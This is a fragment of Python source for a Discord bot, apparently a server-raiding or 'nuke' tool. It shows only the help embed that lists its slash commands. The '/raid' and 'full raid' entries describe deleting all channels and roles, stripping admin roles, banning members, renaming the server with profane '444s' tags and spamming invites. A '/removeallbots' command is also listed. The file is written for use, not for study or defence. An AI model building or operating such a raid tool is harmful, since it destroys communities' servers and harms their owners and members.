...
async def list_commands(interaction: discord.Interaction):
    ...
    embed.add_field(
        name="/raid",
        value="`guild_id:str channel_count:int`\nDelete all channels/roles, remove admin roles, ban honeypot, create new channels 'get-fucked-by-the-444s', send invite, rename server to 444.",
        inline=False
    )
    embed.add_field(
        name="/wipe",
    ...
    embed.add_field(
        ...
        value="`guild_id:str channel_count:int`\nFull raid: ban honeypot, delete admin roles, delete all channels/roles, rename to FUCKED BY THE 444S, ban all members except owner/bot, create channels with invite.",
        inline=False
    )
    embed.add_field(
        name="/removeallbots",
